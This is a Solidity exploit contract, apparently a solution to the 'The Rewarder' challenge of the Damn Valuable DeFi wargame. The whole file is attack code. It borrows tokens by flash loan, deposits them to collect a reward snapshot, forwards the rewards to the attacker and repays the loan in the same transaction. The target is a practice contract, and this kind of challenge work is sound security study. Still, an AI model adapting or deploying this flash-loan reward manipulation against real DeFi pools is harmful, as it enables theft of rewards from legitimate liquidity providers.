// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

interface IRewardToken {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

interface ITheRewarderPool {
    function liquidityToken() external returns (IDamnValuableToken);

    function rewardToken() external returns (IRewardToken);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract TheRewarderPoolExploit is IFlashLoanReceiver {
    address private attacker;
    uint256 private tokensInLenderPool;
    IFlashLoanerPool private iFlashLoanerPool;
    ITheRewarderPool private iRewarderPool;
    IDamnValuableToken private iLiquidityToken;
    IRewardToken private iRewardToken;

    constructor(
        uint256 _tokensInLenderPool,
        address flashLoanerPool,
        address rewarderPool
    ) {
        attacker = msg.sender;
        tokensInLenderPool = _tokensInLenderPool;
        iFlashLoanerPool = IFlashLoanerPool(flashLoanerPool);
        iRewarderPool = ITheRewarderPool(rewarderPool);
        iLiquidityToken = ITheRewarderPool(rewarderPool).liquidityToken();
        iRewardToken = ITheRewarderPool(rewarderPool).rewardToken();
    }

    function attack() external {
        iFlashLoanerPool.flashLoan(tokensInLenderPool);
    }

    // receive flash loan from flashloanerpool, like callback
    function receiveFlashLoan(uint256 amount) external override {
        // approve and deposit all borrow tokens
        iLiquidityToken.approve(address(iRewarderPool), amount);
        iRewarderPool.deposit(amount);

        // Get reward from pool
        uint256 reward = iRewarderPool.distributeRewards();

        // send reward to attacker
        iRewardToken.transfer(attacker, reward);

        // withdarw all LP tokens
        iRewarderPool.withdraw(amount);
        
        // send back to flash loan pool
        iLiquidityToken.transfer(address(iFlashLoanerPool), amount);
    }
}
